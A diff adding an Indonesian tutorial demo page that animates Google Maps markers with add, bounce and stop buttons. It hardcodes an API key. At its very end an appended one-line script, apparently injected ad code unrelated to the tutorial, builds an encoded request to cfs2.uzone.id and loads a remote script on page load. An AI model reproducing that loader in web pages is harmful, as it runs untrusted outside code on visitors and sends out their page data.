@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="Demo tutoral by www.java-sc.web.id" content="">
+    <meta name="Hady Eka Saputra" content="">
+    <title>JSC - Demo Google Maps API</title>
+    <link href="../css/bootstrap.min.css" rel="stylesheet" type="text/css">
+    <link href='http://www.java-sc.web.id/favicon.ico' rel='icon' type='image/x-icon'/>
+    <script src="https://use.fontawesome.com/2642b88c56.js"></script>
+    <link href="../css/style.css" rel="stylesheet">
+	<link id="t-colors" href="../css/blue.css" rel="stylesheet">
+	<style type="text/css">
+	#map {
+		height: 500px;
+	}
+	</style>
+  <script type="text/javascript">
+		var map;
+    var penanda = [];
+    var posisi = {lat:0.512574, lng:  101.448355};
+		function initMap() {
+		  map = new google.maps.Map(document.getElementById('map'), {
+		    center: posisi,
+		    zoom: 13,
+		  });
+
+      function tambah() {
+      var sw = map.getBounds().getSouthWest();
+      var ne = map.getBounds().getNorthEast();
+      for (var i = 0; i < 5; i++) {
+        setTimeout(function() {
+          var lat = Math.random() * (ne.lat() - sw.lat()) + sw.lat();
+          var lng = Math.random() * (ne.lng() - sw.lng()) + sw.lng();
+          penanda.push(new google.maps.Marker({
+            position: new google.maps.LatLng(lat, lng),
+            map: map,
+            animation: google.maps.Animation.DROP
+          }));
+        }, i * 200);
+      }
+    }
+    document.getElementById("tambah").onclick = tambah;
+
+    document.getElementById("animasi").onclick = function() {
+      for (var i = 0; i < penanda.length; i++) {
+        penanda[i].setAnimation(google.maps.Animation.BOUNCE);
+      }
+    };
+
+    document.getElementById("berhenti").onclick = function() {
+      for (var i = 0; i < penanda.length; i++) {
+        penanda[i].setAnimation(null);
+      }
+    };
+
+    google.maps.event.addListenerOnce(map, 'tilesloaded', tambah);
+  }
+    </script>
+    <script async defer src="https://maps.googleapis.com/maps/api/js?key=AIzaSyDKN8E3VeLkA5mgeENXiKp9tjhPlQ95TPc&callback=initMap">
+    </script>
+	</head>
+<body id="page-top" data-spy="scroll" data-target=".navbar-custom">
+
+<div id="wrapper">
+	
+    <nav class="navbar navbar-custom navbar-fixed-top" role="navigation">
+		<div class="top-area">
+			<div class="container">
+				<div class="row">
+					<div class="col-sm-6 col-md-6">
+					<a href="http://www.java-sc.web.id/2016/02/membuat-animasi-pada-marker-google-maps.html"> <p class="bold text-left"><i class="fa fa-arrow-circle-left"></i> Membuat Animasi Pada Marker Google Maps</p></a>
+					</div>
+					<div class="col-sm-6 col-md-6">
+					<a href="http://www.java-sc.web.id/2016/02/pendahuluan-1-membuat-marker-pada-google-maps.html"><p class="bold text-right">Membuat Marker Pada Google Maps <i class="fa fa-arrow-circle-right"></i></p></a>
+					</div>
+				</div>
+			</div>
+		</div>
+        <!-- /.container -->
+    </nav>
+	<!-- Section: intro -->
+    <section id="intro" class="intro">
+		<div class="intro-content">
+			<div class="container">
+				<div class="row">
+					<div class="col-lg-12">
+						<div class="form-wrapper">
+						<div class="wow fadeInRight">
+						
+							<div class="panel panel-skin" style="max-height: 100;">
+							<div class="panel-heading">
+									<center><h3 class="panel-title"><span class="fa fa-pencil-square-o"></span>Membuat Animasi Pada Marker Google Maps - One</h3></center>
+							</div>
+									<div class="panel-body" id="map"></div>
+							</div>				
+						  <div class="col-md-12">
+						  <button id="tambah">Tambah Marker</button>
+              <button id="animasi">Event Bounce</button>
+              <button id="berhenti">Stop</button>
+						  </div>
+						</div>
+						</div>
+					</div>					
+				</div>		
+			</div>
+		</div>		
+    </section>
+	<footer>
+		<div class="sub-footer">
+		<div class="container">
+			<div class="row">
+				<div class="col-sm-12">
+					<div class="text-center">
+					<p>Copyright 2016 - JSC-Developer</p>
+					</div>
+				</div>
+			</div>	
+		</div>
+		</div>
+	</footer>
+
+</div>
+    <script src="../js/jquery.min.js"></script>	 
+    <script src="../js/bootstrap.min.js"></script>
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs2.uzone.id/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582ECSaLdwqSpnjxq7EfLt3ABSiWP40IPY4K6XG7n0x1eMXhOVlje%2fzIe1l968PrAxHAzP4vQEgSSIm3AaLaLHJVS6ILvOLspHBWPQXyCdj8CVc7c5FKKsR3AAc6DQmp4im0dp57Ts8KePS84iCESJgoedsRcLBv32VfOFVGQgDpX8MjcKOyWMWZlNctRQOmzHdveDS6B0IsG%2ffH3lyIKxUblFwjU1made8c8RvVeffAf6wBDPdrNF7VQQ%2b0SoxIW0E30t%2bCKQJ9t9QxI4aAC%2fZ5iZN2iL3nE4r11F1Ip8NrS5oCdOgSLYaKNFtwnzVkqzgh03k5%2b6acgYzMtFWCJk3cXHHctr5rtILtiIsLZwVW9nYh%2b5XBvpW0gmte60maLbvzpnJXpWG%2bL2B6ncDQvAX7KqUj97FhiEPAFznvCR3Bj%2bCz4DGQ0OFdhh%2fFBxLIdWVqGh3R7J42AD3n3lkOXeX4%2f09RFavVk%2b%2b7Mnhbn7y0TgN4%2fgirtP1qFxIT83jFxd7xGuVLfvKNrRyT1atH6ptnMP9ZRM5tD8aooSo09g2en4X%2fkkNH2nG7USvks95voDOckL3VE8%2f3Hw04NFQo3DJH3i88qW8U7C3g%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+</html>
